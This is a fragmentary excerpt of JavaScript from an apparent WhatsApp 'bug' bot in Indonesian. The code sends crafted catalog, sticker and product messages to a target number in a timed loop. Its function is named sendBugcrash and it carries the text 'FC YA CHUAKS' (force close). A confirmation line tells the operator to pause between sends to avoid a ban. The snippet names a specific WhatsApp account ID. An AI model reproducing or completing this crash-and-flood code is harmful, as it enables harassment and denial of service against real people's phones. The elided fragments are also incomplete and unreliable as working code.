CATALOG :
{
    ...
    "businessOwnerJid": "6283838077485@s.whatsapp.net",
    }
    }), { userJid: from, quoted: lep  })
    diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
    await sleep(ms(waktu))
    }
    diablobotwhatsapp.reply(`*SUKSES DI KIRIM JANGAN LUPA DI JEDA / KENON* `)
    }
    ...
    STICKER : 
    {
        ...
        await sleep(ms(waktu))
         ...
         PRODUK :
         {
            ...
            waktu = '3s'
            for (let i = 0; i < jumlah; i++) {
            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6283838077485@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
            await sleep(ms(waktu))
            }
            }
